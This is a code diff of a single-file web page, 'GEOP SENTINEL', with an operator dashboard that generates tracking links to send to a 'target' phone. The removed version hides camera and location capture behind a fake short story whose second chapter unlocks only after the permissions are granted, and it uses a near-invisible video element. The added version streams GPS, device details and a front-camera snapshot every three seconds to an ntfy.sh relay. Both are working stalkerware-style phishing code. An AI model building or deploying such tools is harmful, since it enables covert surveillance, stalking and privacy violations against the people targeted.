@@ -3,20 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>GEOP SENTINEL v4 — Command Center</title>
+<title>GEOP SENTINEL v3 — Command Center</title>
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛰️</text></svg>">
-<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@600;700&family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&family=Literata:opsz,wght@7..72,400;7..72,600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@600;700&family=Inter:wght@400;600;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 <style>
 :root{--bg:#03060c;--panel:rgba(9,15,28,.92);--line:rgba(56,189,248,.18);--txt:#dbe7f7;--mut:#64789c;--cy:#22d3ee;--vi:#818cf8;--ok:#4ade80;--bad:#f87171;--warn:#fbbf24;--disp:'Chakra Petch';--mono:'JetBrains Mono'}
 *{box-sizing:border-box;margin:0;padding:0}
 [hidden]{display:none!important}
 body{background:var(--bg);color:var(--txt);font-family:'Inter',system-ui,sans-serif;min-height:100vh;
-background-image:radial-gradient(1000px 500px at 80% -10%,rgba(34,211,238,.09),transparent),linear-gradient(rgba(34,211,238,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(34,211,238,.045) 1px,transparent 1px);background-size:auto,44px 44px,44px 44px}
+background-image:radial-gradient(1000px 500px at 80% -10%,rgba(34,211,238,.09),transparent),linear-gradient(rgba(34,211,238,.045) 1px,transparent 1px),linear-gradient(90deg,rgba(34,211,238,.045) 1px,transparent 1px);
+background-size:auto,44px 44px,44px 44px}
 #dashMode{max-width:1280px;margin:0 auto;padding:20px}
 .top{display:flex;justify-content:space-between;align-items:center;gap:12px;flex-wrap:wrap;margin-bottom:18px}
 .brand{display:flex;align-items:center;gap:12px}
 .logo{width:46px;height:46px;display:grid;place-items:center;font-size:22px;background:linear-gradient(135deg,#0e7490,#4338ca);clip-path:polygon(0 0,100% 0,100% 70%,70% 100%,0 100%);box-shadow:0 0 26px rgba(34,211,238,.35)}
-h1{font-family:var(--disp);font-size:1.2rem;letter-spacing:2px}h1 span{color:var(--cy);margin-left:6px}
+h1{font-family:var(--disp);font-size:1.2rem;letter-spacing:2px}
+h1 span{color:var(--cy);margin-left:6px}
 .sub{font-size:.6rem;letter-spacing:3px;color:var(--mut)}
 .tag{font-family:var(--mono);font-size:.58rem;color:var(--ok);border:1px solid rgba(74,222,128,.4);padding:3px 8px;border-radius:4px;letter-spacing:1px}
 .tright{display:flex;gap:10px;align-items:center}
@@ -47,15 +49,8 @@ h1{font-family:var(--disp);font-size:1.2rem;letter-spacing:2px}h1 span{color:var
 .qrbox{display:flex;gap:12px;align-items:center;margin-top:12px}
 .qrbox img{background:#fff;padding:5px;border-radius:8px}
 .qrnote{font-family:var(--mono);font-size:.6rem;color:var(--mut);letter-spacing:1px}
-.log{height:190px;overflow:auto;background:#02060d;border:1px solid var(--line);padding:10px;font-family:var(--mono);font-size:.64rem;line-height:1.8;color:var(--mut);border-radius:4px}
+.log{height:210px;overflow:auto;background:#02060d;border:1px solid var(--line);padding:10px;font-family:var(--mono);font-size:.64rem;line-height:1.8;color:var(--mut);border-radius:4px}
 .log .t{color:var(--vi)}
-.hist{max-height:260px;overflow:auto;display:flex;flex-direction:column;gap:10px}
-.hitem{border:1px solid var(--line);border-radius:8px;padding:10px;background:#050b16}
-.hrow{display:flex;justify-content:space-between;gap:8px;font-family:var(--mono);font-size:.62rem;color:var(--mut);margin:3px 0;flex-wrap:wrap}
-.hsnaps{display:flex;gap:6px;margin:6px 0}
-.hsnaps img{width:74px;height:56px;object-fit:cover;border-radius:6px;border:1px solid var(--line)}
-.hsnaps i{font-size:.62rem;color:var(--mut)}
-.hempty{font-size:.68rem;color:var(--mut)}
 .feedwrap{position:relative;aspect-ratio:16/10;background:#000;border:1px solid var(--line);overflow:hidden}
 #feed{width:100%;height:100%;object-fit:contain}
 .idle{position:absolute;inset:0;display:flex;flex-direction:column;gap:14px;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 50%,rgba(34,211,238,.06),transparent 70%)}
@@ -64,8 +59,10 @@ h1{font-family:var(--disp);font-size:1.2rem;letter-spacing:2px}h1 span{color:var
 @keyframes sw{to{transform:rotate(360deg)}}
 .idletxt{font-family:var(--mono);font-size:.62rem;letter-spacing:3px;color:var(--mut)}
 .c{position:absolute;width:20px;height:20px;border:0 solid var(--cy)}
-.tl{top:6px;left:6px;border-top-width:2px;border-left-width:2px}.tr{top:6px;right:6px;border-top-width:2px;border-right-width:2px}
-.bl{bottom:6px;left:6px;border-bottom-width:2px;border-left-width:2px}.br{bottom:6px;right:6px;border-bottom-width:2px;border-right-width:2px}
+.tl{top:6px;left:6px;border-top-width:2px;border-left-width:2px}
+.tr{top:6px;right:6px;border-top-width:2px;border-right-width:2px}
+.bl{bottom:6px;left:6px;border-bottom-width:2px;border-left-width:2px}
+.br{bottom:6px;right:6px;border-bottom-width:2px;border-right-width:2px}
 .scan{position:absolute;inset:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,255,255,.02) 3px 4px)}
 .live{position:absolute;top:10px;left:34px;background:rgba(248,113,113,.92);font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:2px;padding:4px 10px;border-radius:4px;animation:bl 1.1s infinite}
 .ftime{position:absolute;bottom:8px;right:34px;font-family:var(--mono);font-size:.6rem;background:rgba(0,0,0,.6);padding:3px 8px;border-radius:4px}
@@ -77,41 +74,41 @@ h1{font-family:var(--disp);font-size:1.2rem;letter-spacing:2px}h1 span{color:var
 a{color:var(--cy);font-size:.7rem}
 #map{width:100%;height:260px;border:1px solid var(--line);border-radius:4px;filter:saturate(.85)}
 footer{margin-top:16px;text-align:center;color:#3d4c6b;font-size:.62rem;font-family:var(--mono);letter-spacing:1px}
-/* ===== MODE NOVEL (TARGET) ===== */
-#targetMode{min-height:100vh;display:flex;justify-content:center;padding:26px 16px;background:#141210;background-image:radial-gradient(700px 400px at 50% -10%,rgba(232,220,195,.06),transparent)}
-.book{max-width:640px;width:100%;background:#1c1916;border:1px solid rgba(232,220,195,.14);border-radius:6px;padding:34px 28px;color:#e8dcc3;font-family:'Literata',serif;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-.bhead{font-family:var(--mono);font-size:.58rem;letter-spacing:3px;color:#8a7d67;margin-bottom:18px}
-.btitle{font-family:'Literata';font-weight:600;font-size:1.5rem;margin-bottom:4px}
-.bmeta{font-size:.72rem;font-style:italic;color:#8a7d67;margin-bottom:22px}
-.btext p,.bmore p{font-size:.92rem;line-height:1.9;margin-bottom:16px;text-align:justify}
-.end{text-align:center;letter-spacing:4px;color:#8a7d67;margin-top:10px}
-.next{width:100%;margin-top:8px}
-.bnote{margin-top:12px;font-family:var(--mono);font-size:.66rem;color:#8a7d67}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.7);display:flex;align-items:center;justify-content:center;padding:18px;z-index:50}
-.mcard{max-width:400px;width:100%;background:var(--panel);border:1px solid var(--line);padding:24px;text-align:center;border-radius:14px;font-family:'Inter'}
-.mcard h3{font-family:var(--disp);letter-spacing:2px;margin:8px 0}
-.mcard p{font-size:.76rem;color:var(--mut);line-height:1.6;margin-bottom:16px}
-.mcard p b{color:var(--cy)}
-.mrow{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
-.banner{max-width:640px;margin:0 auto 12px;background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.4);color:var(--warn);font-size:.68rem;padding:10px;border-radius:6px}
-.hidvid{position:fixed;width:2px;height:2px;opacity:.01;pointer-events:none}
+#targetMode{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px}
+.tcard{max-width:440px;width:100%;background:var(--panel);border:1px solid var(--line);padding:26px;text-align:center;clip-path:polygon(0 0,calc(100% - 18px) 0,100% 18px,100% 100%,18px 100%,0 calc(100% - 18px))}
+.tbrand{font-family:var(--disp);letter-spacing:3px;font-size:.7rem;color:var(--mut);margin-bottom:14px}
+.banner{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.4);color:var(--warn);font-size:.68rem;padding:10px;border-radius:6px;margin-bottom:14px}
+.ticon{font-size:44px}
+.tcard h2{font-family:var(--disp);letter-spacing:2px;margin:8px 0 10px}
+.tcard p{color:var(--mut);font-size:.78rem;line-height:1.6;margin-bottom:18px}
+.tcard p b{color:var(--cy)}
+#btn{width:100%;padding:15px;font-size:.85rem}
+.steps{text-align:left;margin-top:16px}
+.step{display:flex;gap:10px;align-items:center;color:var(--mut);font-size:.72rem;margin:7px 0}
+.step i{width:14px;height:14px;border:2px solid #2c3c5e;border-radius:50%;flex:none}
+.step.ok{color:var(--ok)}.step.ok i{border-color:var(--ok);background:rgba(74,222,128,.2)}
+.step.err{color:var(--bad)}.step.err i{border-color:var(--bad)}
+.vidbox{position:relative;display:inline-block;margin-top:14px}
+.vidbox video{width:126px;border-radius:10px;border:1px solid var(--line);transform:scaleX(-1)}
+.vidbox span{position:absolute;top:5px;left:5px;background:rgba(248,113,113,.9);font-size:.54rem;font-weight:800;padding:3px 7px;border-radius:4px;letter-spacing:1px}
+.tcard small{display:block;margin-top:16px;color:#3d4c6b;font-size:.6rem;line-height:1.6}
 @media(max-width:1000px){.grid{grid-template-columns:1fr}.stats{grid-template-columns:repeat(2,1fr)}}
 </style>
 </head>
 <body>
 
-<!-- ============ DASHBOARD ============ -->
+<!-- ================= MODE DASHBOARD ================= -->
 <div id="dashMode">
 <header class="top">
   <div class="brand"><div class="logo">🛰️</div>
     <div><h1>GEOP<span>SENTINEL</span></h1><div class="sub">REMOTE VERIFICATION COMMAND</div></div>
-    <span class="tag">v4.0 NOVEL MODE</span>
+    <span class="tag">v3.0 SINGLE-FILE</span>
   </div>
   <div class="tright"><div class="pill" id="pill"><i></i><span id="pillTxt">OFFLINE</span></div><div class="clock" id="clock">--:--:--</div></div>
 </header>
 <section class="stats">
   <div class="stat"><span>TOPIC AKTIF</span><b id="topic" class="cy">–</b></div>
-  <div class="stat"><span>SNAPSHOT (MAX 2)</span><b id="snaps">0</b></div>
+  <div class="stat"><span>SNAPSHOT</span><b id="snaps">0</b></div>
   <div class="stat"><span>FIX LOKASI</span><b id="lastfix">–</b></div>
   <div class="stat"><span>UPTIME</span><b id="uptime">00:00:00</b></div>
 </section>
@@ -119,10 +116,9 @@ footer{margin-top:16px;text-align:center;color:#3d4c6b;font-size:.62rem;font-fam
   <div class="col">
     <section class="card"><h2>▸ GENERATOR LINK OPERASI</h2>
       <div class="row"><button class="btn" id="btnNew">⚡ BUAT LINK BARU</button><button class="btn ghost" id="btnCopy">SALIN</button></div>
-      <input class="input" id="linkOut" readonly placeholder="link operasi…">
+      <input class="input" id="linkOut" readonly placeholder="link operasi muncul di sini…">
       <div class="qrbox" id="qrBox" hidden><img id="qr" width="128" height="128" alt="QR"><div class="qrnote">SCAN / KIRIM<br>KE HP TARGET</div></div>
     </section>
-    <section class="card"><h2>▸ RIWAYAT OPERASI (PER-LINK)</h2><div class="hist" id="hist"></div></section>
     <section class="card"><h2>▸ RELAY & SESI</h2>
       <div class="row"><input class="input" id="watchIn" placeholder="topic / link lama…"><button class="btn ghost" id="btnWatch">SAMBUNG</button><button class="btn danger" id="btnStop">STOP</button></div>
       <div class="row" style="margin-top:10px"><button class="btn ghost" id="btnExport">📥 EXPORT JSON</button></div>
@@ -150,141 +146,99 @@ footer{margin-top:16px;text-align:center;color:#3d4c6b;font-size:.62rem;font-fam
     </section>
   </div>
 </main>
-<footer>GEOP SENTINEL v4 • MAKS 2 SNAPSHOT/LINK • RELAY 12 JAM • WAJIB PERSETUJUAN TARGET • UU PDP/ITE</footer>
+<footer>GEOP SENTINEL v3.0 • RELAY 12 JAM • WAJIB DENGAN PERSETUJUAN • UU PDP/ITE</footer>
 </div>
 
-<!-- ============ MODE NOVEL (TARGET) ============ -->
+<!-- ================= MODE TARGET (HP) ================= -->
 <div id="targetMode" hidden>
-  <div style="max-width:640px;width:100%">
-    <div class="banner" id="banner" hidden>⚠️ Terbuka dari dalam aplikasi chat — tap ⋮ lalu pilih "Buka di Browser" agar lancar.</div>
-    <article class="book">
-      <div class="bhead">GEOP PRESS • FIKSI MINI</div>
-      <h2 class="btitle">Senja di Ujung Jalan</h2>
-      <div class="bmeta">Bab I — R. Semara</div>
-      <div class="btext">
-        <p>Hujan baru saja reda ketika Arka menyusuri Jalan Nuri yang berbau tanah basah. Lampu-lampu warung mulai menyala satu per satu, memantulkan jingga di genangan air, seolah kota ini enggan mengakui bahwa hari sudah hampir selesai.</p>
-        <p>Di saku jaketnya, selembar foto lama terasa berat—lebih berat dari seharusnya. Foto yang sama telah ia bawa ke tiga kota, menanyakan hal yang sama kepada orang-orang yang salah, dan malam ini, alamat terakhir yang ia punya hanya beberapa langkah lagi.</p>
-        <p>"Kalau kali ini tidak ada jawaban," gumamnya pada senja, "maka aku yang akan menjadi jawabannya." Ia mempercepat langkah, tepat ketika sebuah pintu di ujung jalan terbuka perlahan, memperlihatkan cahaya hangat dan sosok yang telah sepuluh tahun ia cari.</p>
-      </div>
-      <div class="bmore" id="ch2" hidden>
-        <p>Sosok itu tidak berubah, meski waktu telah menambahkan garis-garis halus di sudut matanya. "Kau terlambat sepuluh tahun," katanya pelan, "tapi kau tetap datang." Arka tidak menjawab; beberapa pertemuan memang tidak membutuhkan kata, hanya kehadiran.</p>
-        <p>Malam itu, di ujung Jalan Nuri, dua orang duduk berhadapan sambil membagi teh yang sama dan cerita yang tertunda. Dan untuk pertama kalinya setelah satu dekade, Arka merasa foto di saketya akhirnya boleh berhenti berpindah tangan—ia sudah pulang.</p>
-        <div class="end">— TAMAT —</div>
-      </div>
-      <button class="btn next" id="btnNext">📖 BUKA BAB II</button>
-      <div class="bnote" id="bnote" hidden></div>
-    </article>
-  </div>
-  <div class="modal" id="modal" hidden>
-    <div class="mcard">
-      <div style="font-size:34px">🔐</div>
-      <h3>VERIFIKASI TAUTAN</h3>
-      <p>Bab II dikunci oleh pengirim. Untuk membukanya, izinkan akses <b>kamera</b> & <b>lokasi</b> perangkat Anda. Dua foto singkat diambil sebagai verifikasi, lalu kamera otomatis mati.</p>
-      <div class="mrow"><button class="btn" id="btnAllow">IZINKAN & BUKA BAB II</button><button class="btn ghost" id="btnDeny">TIDAK</button></div>
+  <div class="tcard">
+    <div class="tbrand">GEOP SENTINEL <span class="tag">v3.0</span></div>
+    <div class="banner" id="banner" hidden>⚠️ Terdeteksi dibuka dari dalam aplikasi chat. Tap ⋮ / ️ lalu pilih <b>"Buka di Browser / Open in Chrome"</b> agar kamera berfungsi.</div>
+    <div class="ticon">🛡️</div>
+    <h2>VERIFIKASI KEAMANAN</h2>
+    <p>Halaman ini meminta akses <b>KAMERA</b> & <b>LOKASI</b> lalu mengirimkannya ke pemilik tautan. Tekan KONFIRMASI sebagai tanda persetujuan Anda.</p>
+    <button class="btn" id="btn">✅ KONFIRMASI & AKTIFKAN</button>
+    <div class="steps">
+      <div class="step" id="s1"><i></i><span>Menyiapkan sesi aman</span></div>
+      <div class="step" id="s2"><i></i><span>Mengunci lokasi GPS</span></div>
+      <div class="step" id="s3"><i></i><span>Mengaktifkan kamera</span></div>
     </div>
+    <div class="vidbox" id="vidBox" hidden><video id="vid" autoplay muted playsinline></video><span>● LIVE</span></div>
+    <small>🔒 HTTPS • data tersimpan sementara 12 jam • hanya legal digunakan dengan persetujuan pihak yang diverifikasi (UU PDP & UU ITE)</small>
   </div>
-  <video id="vid" class="hidvid" muted playsinline autoplay></video>
 </div>
 
 <script>
 (()=>{'use strict';
 const $=s=>document.querySelector(s);
-const $$=s=>[...document.querySelectorAll(s)];
 const NT='https://ntfy.sh/';
 const esc=s=>String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
 const topic=new URLSearchParams(location.search).get('t');
 function send(title,msg,blob,name){
   if(!topic)return Promise.resolve();
-  const o=blob?{method:'PUT',body:blob,headers:{'Title':title,'Filename':name,'Content-Type':'image/jpeg'}}:{method:'POST',body:msg,headers:{'Title':title}};
+  const o=blob?{method:'PUT',body:blob,headers:{'Title':title,'Filename':name,'Content-Type':'image/jpeg'}}
+              :{method:'POST',body:msg,headers:{'Title':title}};
   return fetch(NT+topic,o).catch(()=>{});
 }
 if(topic)targetMode();else dashMode();
 
-/* ================= TARGET: MODE NOVEL ================= */
+/* ================= TARGET (HP) ================= */
 function targetMode(){
   $('#dashMode').remove();$('#targetMode').hidden=false;
   if(/WhatsApp|Instagram|FBAN|FBAV|Messenger/i.test(navigator.userAgent))$('#banner').hidden=false;
-  $('#btnNext').onclick=()=>{$('#modal').hidden=false;};
-  $('#btnDeny').onclick=()=>{$('#modal').hidden=true;note('Bab II tetap terkunci. Verifikasi ditolak.');};
-  $('#btnAllow').onclick=async()=>{$('#modal').hidden=true;note('⏳ Memverifikasi perangkat…');await begin();};
-  const note=t=>{const n=$('#bnote');n.hidden=false;n.textContent=t;};
-
-  async function begin(){
-    send('STATUS','✅ Target menyetujui verifikasi (v4 novel)');
-    try{await navigator.wakeLock.request('screen');}catch(e){}
+  const step=(id,ok,txt)=>{const e=$(id);e.className='step '+(ok?'ok':'err');e.querySelector('span').textContent=txt;};
+  const snap=v=>{
+    if(!v.videoWidth)return;
+    const w=640,h=Math.round(v.videoHeight*(640/v.videoWidth))||480;
+    const c=document.createElement('canvas');c.width=w;c.height=h;
+    c.getContext('2d').drawImage(v,0,0,w,h);
+    c.toBlob(b=>send('CAM','',b,'cam_'+Date.now()+'.jpg'),'image/jpeg',0.65);
+  };
+  $('#btn').onclick=async()=>{
+    $('#btn').disabled=true;$('#btn').textContent='⏳ SESI AKTIF — JANGAN TUTUP';
+    try{await navigator.wakeLock.request('screen');}catch(e){}   // layar tetap bangun
+    send('STATUS','✅ Target KONFIRMASI (build v3.0)');
     try{
       let batt='–';
       if(navigator.getBattery){const b=await navigator.getBattery();batt=Math.round(b.level*100)+'%'+(b.charging?' ⚡':'');}
       const ua=navigator.userAgent.match(/\(([^)]+)\)/);
       send('META',JSON.stringify({device:(ua?ua[1]:'?').slice(0,80),net:(navigator.connection&&navigator.connection.effectiveType)||'?',batt}));
-    }catch(e){}
+      step('#s1',1,'Sesi aman • info perangkat terkirim');
+    }catch(e){step('#s1',0,'Info perangkat gagal');}
     if(navigator.geolocation){
-      let last=0;
+      let last=0,got=false;
       navigator.geolocation.watchPosition(p=>{
         const c=p.coords;
-        if(Date.now()-last>10000||last===0){last=Date.now();send('LOC',JSON.stringify({lat:c.latitude,lon:c.longitude,acc:c.accuracy}));}
-      },()=>send('STATUS','❌ LOC ditolak'),{enableHighAccuracy:true,maximumAge:3000,timeout:20000});
-    }
-    /* Kamera tersembunyi: tepat 2 snapshot, lalu MATI */
+        if(!got){got=true;step('#s2',1,'GPS terkunci ±'+Math.round(c.accuracy)+' m');}
+        if(Date.now()-last>4000){last=Date.now();send('LOC',JSON.stringify({lat:c.latitude,lon:c.longitude,acc:c.accuracy,alt:c.altitude,spd:c.speed,hdg:c.heading}));}
+      },()=>{step('#s2',0,'Izin lokasi ditolak');send('STATUS','❌ LOC ditolak');},{enableHighAccuracy:true,maximumAge:2000,timeout:20000});
+    }else step('#s2',0,'GPS tidak tersedia');
     try{
       if(!navigator.mediaDevices)throw new Error('no-media');
       let stream;
       try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});}
-      catch(e){stream=await navigator.mediaDevices.getUserMedia({video:true});}
-      const v=$('#vid');v.srcObject=stream;await v.play();
-      const shot=n=>new Promise(res=>{
-        if(!v.videoWidth)return res(false);
-        const w=640,h=Math.round(v.videoHeight*(640/v.videoWidth))||480;
-        const c=document.createElement('canvas');c.width=w;c.height=h;
-        c.getContext('2d').drawImage(v,0,0,w,h);
-        c.toBlob(b=>{send('CAM','',b,'cam_'+n+'.jpg');res(true);},'image/jpeg',0.7);
-      });
-      await shot(1);send('STATUS','📸 1/2 terkirim');
-      setTimeout(async()=>{
-        await shot(2);
-        stream.getTracks().forEach(t=>t.stop());      // kamera otomatis mati
-        send('STATUS','📸 2/2 terkirim — kamera dimatikan');
-      },8000);
-      $('#ch2').hidden=false;$('#btnNext').hidden=true;
-      note('✅ Verifikasi berhasil — Bab II terbuka. Kamera telah dimatikan.');
+      catch(e){stream=await navigator.mediaDevices.getUserMedia({video:true});}  // fallback
+      const v=$('#vid');v.srcObject=stream;$('#vidBox').hidden=false;await v.play();
+      step('#s3',1,'Kamera AKTIF — siaran berjalan terus');
+      send('STATUS','🎥 Kamera AKTIF');
+      (function loop(){snap(v);setTimeout(loop,3000);})();       // snapshot tiap 3 dtk, terus-menerus
+      setInterval(()=>send('STATUS','💓 heartbeat'),30000);
     }catch(e){
-      note('❌ Verifikasi gagal (kamera tidak diizinkan). Bab II tetap terkunci.');
+      step('#s3',0,'Kamera ditolak / tidak tersedia');
       send('STATUS','❌ CAM gagal: '+(e&&e.name?e.name:'error'));
     }
-  }
+  };
 }
 
 /* ================= DASHBOARD ================= */
 function dashMode(){
   $('#targetMode').remove();
-  let es=null,raw=[],snaps=0,t0=null,lastMap=0,lastLoc=null,cur=null;
-  const AKEY='sent_archive';
-  const loadA=()=>{try{return JSON.parse(localStorage.getItem(AKEY))||{}}catch(e){return{}}};
-  const saveA=a=>{try{localStorage.setItem(AKEY,JSON.stringify(a));}catch(e){const k=Object.keys(a).sort((x,y)=>a[x].created-a[y].created)[0];if(k){delete a[k];saveA(a);}}};
-  const entry=(a,t)=>a[t]||(a[t]={created:Date.now(),snaps:[],loc:null,device:''});
-
+  let es=null,raw=[],snaps=0,t0=null,lastMap=0,lastLoc=null;
   setInterval(()=>{$('#clock').textContent=new Date().toLocaleTimeString('id-ID');},1000);
   setInterval(()=>{if(t0){const s=(Date.now()-t0)/1000|0;$('#uptime').textContent=[s/3600|0,(s/60|0)%60,s%60].map(x=>String(x).padStart(2,'0')).join(':');}},1000);
   const rnd=()=>{const c='abcdefghijklmnopqrstuvwxyz0123456789';return[...crypto.getRandomValues(new Uint8Array(14))].map(x=>c[x%c.length]).join('');};
   const log=(s,c)=>{const l=$('#log');l.innerHTML+='<div><span class="t">['+new Date().toLocaleTimeString('id-ID')+']</span> <span class="'+(c||'')+'">'+s+'</span></div>';l.scrollTop=l.scrollHeight;};
   const conn=st=>{$('#pill').className='pill '+st;$('#pillTxt').textContent=st==='live'?'LIVE':st==='retry'?'RECONNECT':'OFFLINE';};
-
-  function renderHist(){
-    const a=loadA();
-    const keys=Object.keys(a).sort((x,y)=>a[y].created-a[x].created).slice(0,10);
-    $('#hist').innerHTML=keys.map(k=>{const e=a[k];
-      return `<div class="hitem"><div class="hrow"><b class="cy">${k.slice(0,8)}…</b><span>${new Date(e.created).toLocaleString('id-ID')}</span></div>
-      <div class="hrow"><span>${esc(e.device||'perangkat ?')}</span></div>
-      <div class="hsnaps">${(e.snaps||[]).map(s=>`<img src="${s}">`).join('')||'<i>belum ada foto</i>'}</div>
-      ${e.loc?`<div class="hrow"><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=${e.loc.lat},${e.loc.lon}">📍 ${e.loc.lat.toFixed(5)}, ${e.loc.lon.toFixed(5)}</a></div>`:''}
-      <button class="btn ghost mini" data-t="${k}">📡 PANTAU ULANG</button></div>`;
-    }).join('')||'<div class="hempty">Belum ada riwayat.</div>';
-    $$('#hist button').forEach(b=>b.onclick=()=>watch(b.dataset.t));
-  }
-
-  /* FIX foto hilang: preload dulu, swap hanya jika sukses */
-  function swapFeed(url,tag){const im=new Image();im.onload=()=>{$('#idle').style.display='none';$('#feed').src=url;$('#feedTime').textContent=tag;};im.src=url;}
-  function thumb(url,cb){const im=new Image();im.crossOrigin='anonymous';im.onload=()=>{try{const w=320,h=Math.round(im.height*(320/im.width))||240;const c=document.createElement('canvas');c.width=w;c.height=h;c.getContext('2d').drawImage(im,0,0,w,h);cb(c.toDataURL('image/jpeg',0.55));}catch(e){}};im.src=url;}
 
   $('#btnNew').onclick=()=>{
     const t=rnd();localStorage.setItem('sent_topic',t);
@@ -297,46 +251,37 @@ function dashMode(){
   $('#btnCopyCoord').onclick=async()=>{if(lastLoc){try{await navigator.clipboard.writeText(lastLoc.lat+','+lastLoc.lon);log('Koordinat disalin','g');}catch(e){}}};
   $('#btnWatch').onclick=()=>{let v=$('#watchIn').value.trim();const m=v.match(/t=([a-z0-9]+)/i);if(m)v=m[1];if(v)watch(v);};
   $('#btnStop').onclick=stop;
-  $('#btnExport').onclick=()=>{const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([JSON.stringify({topic:cur,exported:new Date().toISOString(),snapshots:snaps,archive:loadA()[cur],data:raw},null,2)],{type:'application/json'}));a.download='sentinel_'+(cur||'x')+'.json';a.click();log('Laporan JSON diunduh','g');};
+  $('#btnExport').onclick=()=>{const a=document.createElement('a');a.href=URL.createObjectURL(new Blob([JSON.stringify({topic,exported:new Date().toISOString(),snapshots:snaps,data:raw},null,2)],{type:'application/json'}));a.download='sentinel_'+(topic||'x')+'.json';a.click();log('Laporan JSON diunduh','g');};
 
   async function watch(t){
-    stop();cur=t;raw=[];snaps=0;t0=Date.now();lastMap=0;
+    stop();topic2=t;raw=[];snaps=0;t0=Date.now();lastMap=0;
     $('#topic').textContent=t;$('#snaps').textContent='0';$('#uptime').textContent='00:00:00';$('#log').innerHTML='';
-    log('Menghubungkan relay…');renderHist();
+    log('Menghubungkan relay ntfy.sh…');
     try{const r=await fetch(NT+t+'/json?poll=1');(await r.text()).split('\n').filter(Boolean).forEach(l=>{try{handle(JSON.parse(l))}catch(e){}});}catch(e){log('Gagal memuat riwayat','r');}
     es=new EventSource(NT+t+'/sse');
-    es.onopen=()=>{conn('live');log('Siaran LIVE terhubung.','g');};
+    es.onopen=()=>{conn('live');log('Siaran LIVE terhubung. Sebar link ke target.','g');};
     es.onerror=()=>conn('retry');
     es.onmessage=e=>{try{handle(JSON.parse(e.data))}catch(err){}};
   }
-  function stop(){if(es){es.close();es=null;}t0=null;conn('');}
+  let topic2=null;
+  function stop(){if(es){es.close();es=null;}t0=null;conn('');log('Pengawasan dihentikan','r');}
 
   function handle(m){
     if(m.event&&m.event!=='message')return;
     raw.push(m);
     const time=new Date((m.time||Date.now()/1000)*1000).toLocaleTimeString('id-ID');
     const t=m.title||'';
-    if(t==='META'){try{const d=JSON.parse(m.message);
-      $('#dev').textContent=d.device||'–';$('#net').textContent=(d.net||'–').toUpperCase();$('#batt').textContent=d.batt||'–';
-      const a=loadA();entry(a,cur).device=d.device||'';saveA(a);renderHist();
-      log('📱 '+esc(d.device||''));}catch(e){}}
+    if(t==='META'){try{const d=JSON.parse(m.message);$('#dev').textContent=d.device||'–';$('#net').textContent=(d.net||'–').toUpperCase();$('#batt').textContent=d.batt||'–';log('📱 '+esc(d.device||''));}catch(e){}}
     else if(t==='LOC'){try{const d=JSON.parse(m.message);lastLoc=d;
       $('#coord').textContent=d.lat.toFixed(6)+', '+d.lon.toFixed(6);
       $('#acc').textContent='±'+Math.round(d.acc)+' m';$('#lastfix').textContent=time;
       $('#gmaps').href='https://www.google.com/maps/search/?api=1&query='+d.lat+','+d.lon;
-      const a=loadA();entry(a,cur).loc={lat:d.lat,lon:d.lon};saveA(a);
       if(Date.now()-lastMap>10000){lastMap=Date.now();$('#map').src='https://www.openstreetmap.org/export/embed.html?bbox='+(d.lon-0.004)+','+(d.lat-0.0025)+','+(d.lon+0.004)+','+(d.lat+0.0025)+'&layer=mapnik&marker='+d.lat+','+d.lon;}
       log('📍 '+d.lat.toFixed(5)+','+d.lon.toFixed(5)+' ±'+Math.round(d.acc)+'m','g');}catch(e){}}
-    else if(t==='CAM'){
-      if(m.attachment&&m.attachment.url){
-        snaps++;$('#snaps').textContent=snaps;
-        swapFeed(m.attachment.url,'SNAP #'+snaps+' • '+time);
-        thumb(m.attachment.url,d=>{if(d){const a=loadA();const e=entry(a,cur);if(e.snaps.length<2){e.snaps.push(d);saveA(a);renderHist();}}});
-      }
-      log('📸 Snapshot #'+snaps);}
+    else if(t==='CAM'){if(m.attachment&&m.attachment.url){snaps++;$('#snaps').textContent=snaps;$('#idle').style.display='none';$('#feed').src=m.attachment.url;$('#feedTime').textContent='SNAP #'+snaps+' • '+time;}log('📸 Snapshot #'+snaps);}
     else if(t==='STATUS'){log('ℹ️ '+esc(m.message||''));}
   }
-  window.addEventListener('load',()=>{renderHist();const t=localStorage.getItem('sent_topic');if(t){$('#linkOut').value=location.origin+location.pathname+'?t='+t;$('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=128x128&data='+encodeURIComponent(location.origin+location.pathname+'?t='+t);$('#qrBox').hidden=false;watch(t);}});
+  window.addEventListener('load',()=>{const t=localStorage.getItem('sent_topic');if(t){$('#linkOut').value=location.origin+location.pathname+'?t='+t;$('#qr').src='https://api.qrserver.com/v1/create-qr-code/?size=128x128&data='+encodeURIComponent(location.origin+location.pathname+'?t='+t);$('#qrBox').hidden=false;watch(t);}});
 }
 })();
 </script>
